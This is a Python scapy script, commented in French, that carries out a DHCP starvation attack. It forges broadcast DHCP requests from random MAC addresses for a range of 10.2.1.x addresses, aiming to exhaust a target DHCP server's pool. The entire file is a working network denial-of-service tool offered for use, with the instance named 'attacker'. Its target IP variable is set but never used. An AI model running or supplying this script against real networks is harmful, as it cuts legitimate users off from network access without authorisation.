from scapy.all import *
import random
import time

class DHCPStarvation():
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.mac_addresses = set()
        self.ip_range = ['10.2.1.' + str(i) for i in range(99, 201)]  # Ajustez selon votre réseau

    def send_dhcp_requests(self):
        for ip in self.ip_range:
            mac = self.generate_mac()
            self.mac_addresses.add(mac)
            # Créer et envoyer une requête DHCP
            dhcp_request = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / IP(src='0.0.0.0', dst='255.255.255.255') / UDP(sport=68, dport=67) / BOOTP(chaddr=mac) / DHCP(options=[('message-type', 'request'), ('requested_addr', ip), 'end'])
            sendp(dhcp_request)
            print(f"Requête DHCP envoyée pour {ip} avec MAC {mac}")
            time.sleep(0.1)  # Pause pour éviter la congestion du réseau

    def generate_mac(self):
        return ':'.join(['%02x' % random.randint(0, 0xff) for _ in range(6)])

if __name__ == "__main__":
    target_ip = "10.2.1.11"  # Remplacez par l'adresse IP du serveur DHCP cible
    attacker = DHCPStarvation(target_ip)
    attacker.send_dhcp_requests()
